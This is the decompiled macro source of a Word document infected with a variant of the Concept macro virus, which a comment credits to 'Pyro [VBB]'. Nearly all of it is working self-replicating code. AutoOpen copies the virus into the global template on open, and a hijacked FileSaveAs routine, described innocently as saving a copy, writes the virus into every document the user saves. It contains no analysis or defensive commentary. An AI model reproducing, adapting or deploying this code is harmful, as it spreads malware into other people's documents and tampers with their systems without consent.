   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "sAevaSeliF"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.sAevaSeliF.MAIN"
   Dim Installed
   Dim I
   Dim FName$
   Dim Macro$
   On Error GoTo -1: On Error GoTo ErrorHandler

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1

   Installed = 0
   For I = 1 To WordBasic.CountMacros(1, 0)
   If WordBasic.[MacroName$](I, 1, 0) = "MSConcept" Then Installed = 1
   Next

   If Installed = 0 Then
   FName$ = WordBasic.[FileName$]()
   Macro$ = FName$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:nepOotuA", Macro$
   Macro$ = FName$ + ":MSConcept"
   WordBasic.MacroCopy "Global:MSConcept", Macro$
   Macro$ = FName$ + ":sAevaSeliF"
   WordBasic.MacroCopy "Global:FileSaveAs", Macro$
   End If

   ErrorHandler:
   If Err.Number <> 102 Then WordBasic.FileSaveAs dlg
   End Sub

   Attribute VB_Name = "MSConcept"

   Public Sub MAIN()
       Rem Presenting The Microsoft Concept Virus.
       Rem Updated by Pyro [VBB] (Author of Word97.NightShade)
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Installed
   Dim I
   Dim FName$
   Dim Macro$
   On Error GoTo -1: On Error GoTo ErrorHandler

   Installed = 0
   For I = 1 To WordBasic.CountMacros(0, 0)
   If WordBasic.[MacroName$](I, 0, 0) = "MSConcept" Then Installed = 1
   Next

   If Installed = 0 Then
   FName$ = WordBasic.[FileName$]()
   Macro$ = FName$ + ":MSConcept"
   WordBasic.MacroCopy Macro$, "Global:MSConcept"
   Macro$ = FName$ + ":sAevaSeliF"
   WordBasic.MacroCopy Macro$, "Global:FileSaveAs"
   Macro$ = FName$ + ":AutoOpen"
   WordBasic.MacroCopy Macro$, "Global:nepOotuA"
   End If

   ErrorHandler:
   End Sub
